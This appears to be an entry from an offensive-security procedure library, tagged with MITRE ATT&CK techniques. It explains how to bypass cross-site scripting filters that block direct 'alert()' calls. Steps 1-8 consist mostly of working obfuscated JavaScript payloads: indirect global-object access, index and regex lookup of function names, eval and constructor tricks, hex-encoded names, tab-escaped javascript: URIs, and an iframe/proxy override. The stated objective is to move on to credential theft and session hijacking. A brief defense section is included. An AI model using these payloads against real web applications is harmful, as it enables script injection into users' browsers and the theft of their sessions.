---
id: 647c366b-78be-4a42-a99d-307e53fcce98
name: Bypass-XSS-Alert-Filter-Using-Alternate-Functions
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.771887+00:00'
updated_at: '2023-04-10T20:21:46.052356+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Bypass using an alternate way to execute an alert]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Filter Bypass and exotic payloads]]'
commands: []
platforms:
  - Web
  - Browser
tools: []
validated: true
---

# Bypass-XSS-Alert-Filter-Using-Alternate-Functions

## Summary

This procedure demonstrates techniques to bypass web application filters designed to block direct 'alert()' calls in Cross-Site Scripting (XSS) attacks by using alternate JavaScript function references, obfuscation methods, and indirect execution paths. These methods allow an attacker to execute JavaScript payloads in a victim's browser despite basic filtering, enabling further actions like credential theft or malware injection.

## Description

Cross-Site Scripting (XSS) involves injecting malicious scripts into web pages viewed by other users. Filters often block straightforward 'alert()' invocations to prevent proof-of-concept exploitation. This procedure covers advanced bypasses using global object properties (e.g., window, self), array methods, index-based access via Object.keys, regex pattern matching for function names, escaped JavaScript URIs, and iframe-based execution. These techniques exploit JavaScript's dynamic nature to reference and invoke the alert function indirectly. Applicable in reflected, stored, or DOM-based XSS scenarios on vulnerable web applications, the goal is to confirm execution and escalate to more damaging payloads. Prerequisites include identifying an injection point, such as unsanitized user input in a search field or comment section.

## Requirements

1. Access to a vulnerable web application with an XSS injection point (e.g., via developer tools or a test environment like OWASP Juice Shop).
2. Basic knowledge of JavaScript and browser developer console usage.
3. Ability to inject and execute arbitrary JavaScript code in the target's browser context.
4. Modern web browser (Chrome, Firefox) for testing.

## Defense

- Implement strict input validation and output encoding (e.g., using libraries like DOMPurify) to sanitize user inputs.
- Deploy Content Security Policy (CSP) headers to restrict inline script execution and define allowed sources.
- Regularly scan and patch web applications using tools like OWASP ZAP or Burp Suite to identify and fix XSS vulnerabilities.
- Enable browser security features like XSS Auditor (deprecated in some browsers) or use HttpOnly/Secure flags on cookies to limit impact.

## Objectives

1. Successfully bypass filters blocking direct 'alert()' calls to confirm XSS vulnerability.
2. Execute obfuscated JavaScript payloads without triggering WAF or client-side protections.
3. Demonstrate potential for credential theft or session hijacking by adapting alert to more malicious functions.

## Instructions

### Step 1: Test Basic Global Object References for Alert Bypass

**Context**: Start with simple property access on global objects like window, parent, self, and top to invoke alert indirectly, avoiding direct function calls that filters might block. This tests if the filter targets literal 'alert' strings.

**Code** ([[codes/XSS-Alert-Bypass-Using-Global-Properties-and-Array-Methods]]):

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

> Execute these in the browser console or inject via the XSS payload. Each line should trigger a numbered alert popup if successful, confirming bypass via property access or array iteration.

### Step 2: Locate Alert Function Index in Global Scope

**Context**: Enumerate global variables to find the index of the 'alert' function using Object.keys(self), which helps in obfuscated access without naming the function directly. This is useful against filters scanning for 'alert' strings.

**Code** ([[codes/Find-Alert-Function-Index-in-Global-Scope]]):

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

> Run this to output the index (typically 5 in standard environments). Use the result to access alert indirectly in subsequent steps.

### Step 3: Execute Alert Using Global Index Access

**Context**: Leverage the index from Step 2 to call alert via array access on Object.keys(self), fully obfuscating the function name and evading string-based filters.

**Code** ([[codes/Execute-Alert-Using-Global-Index]]):

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

> The first line returns the function name for verification; the second executes it with a parameter, producing an alert with '1'. Adapt the index based on your environment.

### Step 4: Bind Alert to Custom Function Using Regex Matching

**Context**: Use a regex to search for functions matching the pattern of 'alert' (e.g., /^a[rel]+t$/) and bind it to a custom function 'a()', allowing indirect invocation. This bypasses filters looking for exact matches.

**Code** ([[codes/Bind-Alert-Function-to-Custom-Function-Using-Regex]]):

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()

// then you can use a() with Object.keys

self[Object.keys(self)[a()]]("1") // alert("1")
```

> Define 'a()' first, then use it to index and call the function. An alert with '1' confirms success.

### Step 5: One-Liner Regex-Based Alert Execution

**Context**: Combine Steps 2-4 into a single obfuscated line for compact payloads suitable for short injection points, maximizing bypass potential.

**Code** ([[codes/One-Liner-Alert-Bypass-Using-Regex-Index]]):

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

> This self-contained snippet should trigger an alert with '1' if the regex matches 'alert'.

### Step 6: Bypass Using Escaped JavaScript URIs

**Context**: Exploit javascript: protocol handlers with escape characters (tab, carriage return) to evade URI filters, combined with prompt for domain confirmation.

**Code** ([[codes/XSS-Javascript-URI-Bypass-Using-Escapes]]):

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

> The prompt displays the domain; subsequent lines redirect to escaped javascript:alert, triggering a popup if the filter doesn't normalize escapes.

### Step 7: Apply Multiple Obfuscation Techniques for Alert

**Context**: Use a variety of string concatenation, constructor calls, regex sources, hex encoding, and timers to invoke alert in diverse ways, testing comprehensive filter evasion.

**Code** ([[codes/Multiple-XSS-Alert-Obfuscation-Techniques]]):

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29`;
```

> Execute sequentially; each should produce a numbered alert or domain popup, validating multiple bypass paths.

### Step 8: Iframe and Proxy for Advanced Bypass

**Context**: Create an iframe to load content and trigger alert in a sandboxed context, then override the alert function with a proxy to evade direct calls or security wrappers.

**Code** ([[codes/XSS-Alert-Bypass-Using-Iframe-and-Proxy]]):

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

> Append the iframe to trigger alert in its context; the proxy redefines window.alert to bypass lockdowns, allowing execution without original invocation.
